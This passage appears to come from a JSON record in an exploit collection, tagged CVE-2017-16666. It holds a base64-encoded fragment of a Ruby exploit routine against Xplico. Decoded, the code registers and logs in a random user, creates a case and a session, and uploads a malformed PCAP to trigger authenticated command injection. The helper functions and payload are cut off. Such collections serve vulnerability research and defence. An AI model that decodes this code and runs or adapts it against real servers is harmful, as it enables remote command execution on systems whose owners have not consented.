AgICBlbmQNCg0KICAgICMgV2Ugb25seSBuZWVkIHRvIGFjY2VzcyB1c2VybmFtZSBhbmQgcGFzc3dvcmQgZm9yIGxvZ2luIGZ1bmMuIExldCdzIGxlYXZlIHRoZW0gYXMgYSBsb2NhbCB2YXJpYWJsZXMuDQogICAgcGFzc3dvcmQgPSByYW5kX3RleHRfYWxwaGEoMzIpDQogICAgdXNlcm5hbWUgPSByYW5kX3RleHRfYWxwaGFfbG93ZXIocmFuZCg4KSs4KQ0KICAgIHJlZ2lzdGVyX3VzZXIodXNlcm5hbWUsIHBhc3N3b3JkKQ0KICAgIGxvZ2luKHVzZXJuYW1lLCBwYXNzd29yZCkNCg0KICAgICMgV2Ugd2lsbCBuZWVkIHRvIGhhdmUgcG9sX2lkIGZvciBjcmVhdGluZyBuZXcgeHBsaWNvIHNlc3Npb24uDQogICAgcG9sX2lkID0gY3JlYXRlX25ld19jYXNlDQogICAgaWYgcG9sX2lkLm5pbD8NCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpVbmtub3duLCAnVW5hYmxlIHRvIGNyZWF0ZSBOZXcgQ2FzZS4nKQ0KICAgIGVuZA0KICAgIHByaW50X2dvb2QoIk5ldyBDYXNlIHN1Y2Nlc3NmdWxseSBjcmV0ZWQuIE91ciBwb2xfaWQgPSAje3BvbF9pZH0iKQ0KDQogICAgIyBDcmVhdGUgeHBsaWNvIHNlc3Npb24gYnkgdXNpbmcgcG9sX2lkDQogICAgc29sX2lkID0gY3JlYXRlX25ld19zb2wocG9sX2lkKQ0KICAgIGlmIHNvbF9pZC5uaWw/DQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5rbm93biwgJ1VuYWJsZSB0byBjcmVhdGUgTmV3IFNvbC4nKQ0KICAgIGVuZA0KICAgIHByaW50X2dvb2QoIk5ldyBTb2xzIHN1Y2Nlc3NmdWxseSBjcmV0ZWQuIE91ciBzb2xfaWQgPSAje3NvbF9pZH0iKQ0KDQogICAgIyBVcGxvYWRpbmcgbWFsZm9ybWVkIFBDQVAgZmlsZS4gV2UgYXJlIGV4cGxvaXRpbmcgYXV0aGVudGljYXRlZCBjbWQgaW5qIGluIGhlcmUuDQogICAgdXBsb2FkX3BjYXAoc29sX2lkKQ0KDQogIGVuZA0KZW5k", 
    "id": "43430", 
    "cves": [
        "CVE-2017-16666"
    ]
}